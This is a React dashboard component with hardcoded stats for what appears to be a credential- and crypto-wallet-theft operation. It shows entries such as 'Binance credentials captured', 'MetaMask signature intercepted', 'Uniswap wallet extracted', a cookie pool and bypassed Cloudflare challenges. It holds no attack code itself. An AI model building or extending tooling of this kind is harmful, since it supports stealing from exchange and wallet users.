import { TrendingUp, Users, Activity, AlertCircle } from 'lucide-react'

export default function Dashboard() {
  const stats = [
    { label: 'Active Platforms', value: '15/61', icon: TrendingUp, color: 'text-green-400' },
    { label: 'Total QPS', value: '342/1000', icon: Activity, color: 'text-blue-400' },
    { label: 'Data Extracted', value: '1,234', icon: Users, color: 'text-purple-400' },
    { label: 'System Uptime', value: '99.8%', icon: AlertCircle, color: 'text-cyan-400' },
  ]

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h1 className="text-3xl font-bold text-white">Dashboard</h1>
        <div className="text-gray-400 text-sm">Last updated: just now</div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        {stats.map((stat) => {
          const Icon = stat.icon
          return (
            <div key={stat.label} className="card">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">{stat.label}</p>
                  <p className="text-2xl font-bold text-white mt-1">{stat.value}</p>
                </div>
                <Icon className={`w-10 h-10 ${stat.color}`} />
              </div>
            </div>
          )
        })}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="card">
          <h2 className="text-xl font-bold text-white mb-4">Quick Stats</h2>
          <div className="space-y-3">
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Cookie Pool Health</span>
              <span className="badge badge-success">8/10 Active</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Cloudflare Challenges</span>
              <span className="badge badge-info">12 Bypassed</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Backend Connection</span>
              <span className="badge badge-success">Connected</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Error Rate</span>
              <span className="badge badge-success">0.2%</span>
            </div>
          </div>
        </div>

        <div className="card">
          <h2 className="text-xl font-bold text-white mb-4">System Status</h2>
          <div className="space-y-3">
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Docker Containers</span>
              <span className="badge badge-success">5/5 Running</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Memory Usage</span>
              <span className="text-white">1.2GB / 2GB</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-gray-400">CPU Usage</span>
              <span className="text-white">34%</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Average Latency</span>
              <span className="text-white">234ms</span>
            </div>
          </div>
        </div>
      </div>

      <div className="card">
        <h2 className="text-xl font-bold text-white mb-4">Recent Activity</h2>
        <div className="space-y-2 text-sm">
          <div className="flex items-center space-x-2 text-gray-300">
            <span className="text-green-400">✓</span>
            <span>14:35:22 - Uniswap wallet extracted (0x7d...)</span>
          </div>
          <div className="flex items-center space-x-2 text-gray-300">
            <span className="text-green-400">✓</span>
            <span>14:35:19 - Binance credentials captured</span>
          </div>
          <div className="flex items-center space-x-2 text-gray-300">
            <span className="text-green-400">✓</span>
            <span>14:35:15 - MetaMask signature intercepted</span>
          </div>
          <div className="flex items-center space-x-2 text-gray-300">
            <span className="text-green-400">✓</span>
            <span>14:35:10 - Aave position extracted</span>
          </div>
          <div className="flex items-center space-x-2 text-gray-300">
            <span className="text-yellow-400">⚠</span>
            <span>14:35:05 - Cloudflare challenge detected (bypassed)</span>
          </div>
        </div>
      </div>
    </div>
  )
}
